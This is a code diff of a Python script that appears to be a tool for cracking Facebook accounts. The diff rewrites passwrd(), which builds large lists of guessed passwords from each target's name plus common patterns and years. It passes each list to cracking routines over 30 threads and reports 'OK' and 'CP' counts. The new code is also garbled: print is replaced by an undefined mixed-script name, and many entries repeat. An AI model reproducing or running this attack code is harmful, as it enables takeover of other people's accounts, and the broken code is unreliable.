@@ -676,64 +676,185 @@ def setting():
 	passwrd()
 
 def passwrd():
-	with tred(max_workers=30) as pool:
-		for yuzong in id2:
-			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-			frs = nmf.split(' ')[0]
-			pwv = []
-			if len(nmf)<6:
-				if len(frs)<3:
-					pass
-				else:
-					pwv.append(nmf)
-					pwv.append(frs + frs)
-					pwv.append('11224455')
-					pwv.append('1122445566')
-					pwv.append('١٢٣٤٥٦')
-					pwv.append('١٢٣٤٥٦٧٨٩')
-					pwv.append('00998877')
-					pwv.append('0099887766')
-			else:
-				if len(frs)<3:
-					pwv.append(nmf)
-				else:
-					pwv.append(nmf)
-					pwv.append(frs + ' ' + frs)
-					pwv.append(frs + '123')
-					pwv.append(frs + '1234')
-					pwv.append('qqwweerr')
-					pwv.append('qqwweerrtt')
-					pwv.append('zzzzxxxx')
-					pwv.append('mmmmnnnn')
-					pwv.append('nnnnmmmm')
-					pwv.append('mmnnbbvv')
-			if 'ya' in pwpluss:
-				for xpwd in pwnya:
-					pwv.append(xpwd)
-			else:pass
-			if 'mobile' in method:
-				pool.submit(crack,idf,pwv)
-			elif 'free' in method:
-				pool.submit(crackfree,idf,pwv)
-			elif 'touch' in method:
-				pool.submit(cracktouch,idf,pwv)
-			elif 'mbasic' in method:
-				pool.submit(crackmbasic,idf,pwv)
-			else:
-				pool.submit(crackmbasic,idf,pwv)
-	print('')
-	cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
-	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
-	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
-	print('')
-	print('>> Lanjut Crack Kembali ( Y/t ) ? ')
-	woi = input('>> Pilih : ')
-	if woi in ['y','Y']:
-		back()
-	else:
-		print(f'\t{x}[=]{k} Been completed {x} <> ')
-		time.sleep(2)
-		exit()
+    with tred(max_workers=30) as pool:
+        for yuzong in id2:
+            idf = yuzong.split('|')[0]
+            nmf = yuzong.split('|')[1].lower()
+            frs = nmf.split(' ')[0]
+            pwv = []
+            if len(nmf) < 6:
+                if len(frs) < 3:
+                    pass
+                else:
+                    pwv.append(nmf)
+                    pwv.append(frs+frs)
+                    pwv.append(frs+' '+frs)
+                    pwv.append(nmf)
+                    pwv.append('07800780')
+                    pwv.append('11223344@@')
+                    pwv.append('00998877')
+                    pwv.append('qqwweerr')
+                    pwv.append('1234512345')
+                    pwv.append('١٢٣٤٥٦')
+                    pwv.append('١٢٣٤٥٦٧٨٩')
+                    pwv.append('1122334455')
+                    pwv.append('1122334455@@')
+                    pwv.append('123@@123')
+                    pwv.append('12345@12345')
+                    pwv.append('aaaassss')
+                    pwv.append('zzxxccvv')
+                    pwv.append('123@123')
+                    pwv.append('1q2w3e4r5t')
+                    pwv.append('0099887766')
+                    pwv.append('009988776655')
+                    pwv.append('19901990')
+                    pwv.append('19911991')
+                    pwv.append('19921992')
+                    pwv.append('19931993')
+                    pwv.append('19941994')
+                    pwv.append('19951995')
+                    pwv.append('19961996')
+                    pwv.append('19971997')
+                    pwv.append('19981998')
+                    pwv.append('19991999')
+                    pwv.append('20002000')
+                    pwv.append('12345@')
+                    pwv.append('12345@@@@@')
+                    pwv.append('aassddff')
+                    pwv.append('5432112345')
+                    pwv.append('123456')
+                    pwv.append('123456789')
+                    pwv.append('@@@@#####')
+                    pwv.append(nmf)
+                    pwv.append('07800780')
+                    pwv.append('11223344@@')
+                    pwv.append('00998877')
+                    pwv.append('qqwweerr')
+                    pwv.append('1234512345')
+                    pwv.append('١٢٣٤٥٦')
+                    pwv.append('١٢٣٤٥٦٧٨٩')
+                    pwv.append('1122334455')
+                    pwv.append('1122334455@@')
+                    pwv.append('123@@123')
+                    pwv.append('12345@12345')
+                    pwv.append('aaaassss')
+                    pwv.append('zzxxccvv')
+                    pwv.append('123@123')
+                    pwv.append('1q2w3e4r5t')
+                    pwv.append('0099887766')
+                    pwv.append('009988776655')
+                    pwv.append('19901990')
+                    pwv.append('19911991')
+                    pwv.append('19921992')
+                    pwv.append('19931993')
+                    pwv.append('19941994')
+                    pwv.append('19951995')
+                    pwv.append('19961996')
+                    pwv.append('19971997')
+                    pwv.append('19981998')
+                    pwv.append('19991999')
+                    pwv.append('20002000')
+                    pwv.append('12345@')
+                    pwv.append('12345@@@@@')
+                    pwv.append('aassddff')
+                    pwv.append('5432112345')
+                    pwv.append('123456')
+                    pwv.append('123456789')
+                    pwv.append('@@@@#####')
+                    pwv.append('١٢٣٤٥٦')
+                    pwv.append('١٢٣٤٥٦٧٨٩')
+                    pwv.append(frs+'123')
+                    pwv.append(frs+'1234')
+                    pwv.append(frs+'12345')
+                    pwv.append(frs+'123456')
+                    pwv.append(frs+'1234567')
+                    pwv.append(frs+'12345678')
+                    pwv.append(frs+'123456789')
+                    pwv.append(frs+'12')
+                    pwv.append(frs+'zzxxccvv')
+                    pwv.append(frs+'mmnnbbvv')
+                    pwv.append(frs+'1990')
+                    pwv.append(frs+'qwer1234')
+                    pwv.append(frs+'1991')
+                    pwv.append(frs+'1992')
+                    pwv.append(frs+'1234567890')
+                    pwv.append(frs+'0987654321')
+                    pwv.append(frs+'noob2007@#$')
+                    pwv.append(frs+'noob2008@#$')
+                    pwv.append(frs+'noob2009@#$')
+                    pwv.append(frs+'qwertyuiopoiuytrewq$#@123')
+                    pwv.append(frs+'asdf1234')
+                    pwv.append(frs+'1993')
+                    pwv.append(frs+'40664066')
+                    pwv.append(frs+'1994')
+                    pwv.append(frs+'mnbvcxz1100')
+                    pwv.append(frs+'mmnnbbvvccxxzz')
+                    pwv.append(frs+'bop2009bop@#$123')
+                    pwv.append(frs+'moh$%1234')
+                    pwv.append(frs+'qwertyuiop')
+                    pwv.append(frs+'1995')
+                    pwv.append(frs+'zxcv1234')
+                    pwv.append(frs+'1996')
+                    pwv.append(frs+'11220099')
+                    pwv.append(frs+'1997')
+                    pwv.append(frs+'112233445566')
+                    pwv.append(frs+'1998')
+                    pwv.append(frs+'1999')
+                    pwv.append(frs+'2000')
+            elif len(frs) < 3:
+                pwv.append(nmf)
+            else:
+                pwv.append(nmf)
+                pwv.append(frs+frs)
+                pwv.append(frs+' '+frs)
+                pwv.append('١٢٣٤٥٦')
+                pwv.append('١٢٣٤٥٦٧٨٩')
+                pwv.append(frs+'123')
+                pwv.append(frs+'1234')
+                pwv.append(frs+'12345')
+                pwv.append(frs+'123456')
+                pwv.append(frs+'1234567')
+                pwv.append(frs+'12345678')
+                pwv.append(frs+'123456789')
+                pwv.append(frs+'12')
+                pwv.append(frs+'1990')
+                pwv.append(frs+'1991')
+                pwv.append(frs+'1992')
+                pwv.append(frs+'1993')
+                pwv.append(frs+'1994')
+                pwv.append(frs+'1995')
+                pwv.append(frs+'1996')
+                pwv.append(frs+'1997')
+                pwv.append(frs+'1998')
+                pwv.append(frs+'1999')
+                pwv.append(frs+'2000')
+            if 'ya' in pwpluss:
+                for xpwd in pwnya:
+                    pwv.append(xpwd)
+            if 'mobile' in method:
+                pool.submit(crack, idf, pwv)
+            elif 'free' in method:
+                pool.submit(crackfree, idf, pwv)
+            elif 'touch' in method:
+                pool.submit(cracktouch, idf, pwv)
+            elif 'mbasic' in method:
+                pool.submit(crackmbasic, idf, pwv)
+            else:
+               pool.submit(crackmbasic, idf, pwv)
+
+    ريفنi('')
+    cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
+    ريفنi(f'''[{b}•{x}]{h} OK : {h}%s ''' % ok)
+    ريفنi(f'''{x}[{b}•{x}]{k} CP : {k}%s{x} ''' % cp)
+    ريفنi('')
+    ريفنi('>> Lanjut Crack Kembali ( Y/t ) ? ')
+    woi = input('>> Pilih : ')
+    if woi in ('y', 'Y'):
+        back()
+    else:
+        ريفنi(f'''\t{x}[=]{k} Been completed {x} <> ''')
+        time.sleep(2)
+        exit()
 
 
 def crack(idf, pwv):
